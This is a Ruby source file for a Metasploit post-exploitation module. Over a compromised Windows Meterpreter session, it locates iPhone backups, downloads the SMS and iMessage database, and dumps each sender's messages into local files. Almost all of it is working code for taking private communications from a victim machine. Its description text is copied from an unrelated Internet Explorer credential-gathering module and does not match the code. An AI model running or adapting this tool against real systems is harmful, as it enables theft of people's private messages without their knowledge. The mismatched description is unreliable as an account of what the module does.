##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Common

	def initialize(info={})
		super(update_info(info,
			'Name'            => "Windows Gather iPhone Backup Data Enumeration",
			'Description'     => %q{
				This module will collect history, cookies, and credentials (from either HTTP
				auth passwords, or saved form passwords found in auto-complete) in
				Internet Explorer. The ability to gather credentials is only supported
				for versions of IE >=7, while history and cookies can be extracted for all
				versions.
			},
			'License'         => MSF_LICENSE,
			'Platform'        => ['windows'],
			'SessionTypes'    => ['meterpreter'],
			'Author'          => ['Matt Andreko "hostess" <matt [at] andreko.net>']
		))
	end
	
	##
	# General methods
	##
	
	def load_sqlite
		begin
			require 'sqlite3'
			return true
		rescue LoadError
			return false
		end
	end

	# Function for creating the folder for gathered data
	def log_folder_create(log_path = nil)
		#Get hostname
		host = Rex::FileUtils.clean_path(sysinfo["Computer"])

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', "enum_iphone", host + filenameinfo )
		else
			logs = ::File.join(Msf::Config.log_directory, "post", "enum_iphone", host + filenameinfo )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)
		return logs
	end

	def get_backup_folders
	  backups = []
	  session.fs.dir.foreach(@remote_backup_path) do |f|
	    next if f == '.' or f == '..'
	    backups << f
    end
    backups
	end

	def run
		#check for meterpreter and version of ie
		if session.type != "meterpreter" and session.platform !~ /win/
			print_error("This module only works with Windows Meterpreter sessions")
			return 0
		end

		has_sqlite = load_sqlite
		if not has_sqlite
			print_error("You don't have sqlite3 installed. Please run gem install sqlite3")
			return
		end
		
    @appdata_path = session.fs.file.expand_path("%APPDATA%")
		@remote_backup_path = "#{@appdata_path}\\Apple Computer\\MobileSync\\Backup\\"
    @sms_filename = "3d0d7e5fb2ce288813306e4d4636395e047a3d28"
    host = sysinfo["Computer"]

		print_status("Running module against #{host}")
		log_folder = log_folder_create()
		
		backup_folders = get_backup_folders()
		
		if backup_folders.nil? || backup_folders.empty?
		  print_error("No backups found.")
		  return
		end
		
		backup_folders.each do |backup_folder|
		  dump_sms(backup_folder, log_folder)
		  
		  # TODO: Add other dump types
		  
	  end
	end
	
	##
	# SMS Methods
	##
	
	def strip_phone_number(number)
	  number.gsub(/[^a-zA-Z0-9]/, '')
	end
	
	def format_epoch_date(date)
	  time = Time.at(date)
	  time.to_s
	end
	
	def format_imessage_date(date)
	  # For some reason, Apple decided that it'd be a good idea to start time at 2001-01-01 00:00:00
	  time = Time.at(date) + 978_307_200 # Seconds difference between epoch and apple's epoch
	  time.to_s
  end
	
	def dump_sms(backup_folder, log_folder)
	  
	  # Look to see if an SMS file exists
	  backup_file = @remote_backup_path+"//"+backup_folder+"//"+@sms_filename
	  if !session.fs.file.exists?(backup_file)
	    print_error("No SMS backup file found at #{backup_file}.")
	    #return
    end
	  
	  # Copy the sqlite3 DB to a local file, so it can be read
	  local_path = store_loot("iphone_sms.raw.#{backup_folder}", "text/plain", session, "iphone_sms_raw_#{backup_folder}")
	  print_status("Downloading SMS database for backup #{backup_folder} to #{local_path}")
	  session.fs.file.download_file(local_path, backup_file)
	  
	  print_status("Reading SMS database and dumping messages")
	  db = SQLite3::Database.new(local_path)
	  db.results_as_hash = true
	  
	  messages = []
	  db.execute("select address, date, text from message where is_madrid = 0") do |row|
	    next if row['address'].nil?
	    messages << {:sender => strip_phone_number(row['address']), :date => format_epoch_date(row['date']), :text => row['text']}
	  end
	  
	  db.execute("select madrid_handle, date, text from message where is_madrid = 1") do |row|
	    next if row['madrid_handle'].nil?
	    messages << {:sender => strip_phone_number(row['madrid_handle']), :date => format_imessage_date(row['date']), :text => row['text']}
	  end
	  
	  # Iterate through messages grouped by the sender
	  senders = messages.inject([]) { |result,h| result << h[:sender] unless result.include?(h[:sender]); result } # Unique list of senders
	  senders.each do |sender|
	    #print_status("Working on sender: #{sender}")
	    sender_messages = messages.select { |i| i[:sender] == sender }
	    sender_messages.sort_by!{|m| m[:date]}
	    #print_debug("Messages from #{sender}: #{sender_messages.length}")
	    
	    messages_string = ""
	    sender_messages.each do |m|
	      messages_string += "#{m[:date]}: #{m[:text]}\n"
      end
	    
	    # Save data to log folder
	    file_local_write(log_folder+"//SMS_#{sender}.txt", messages_string)
    end
  end
end
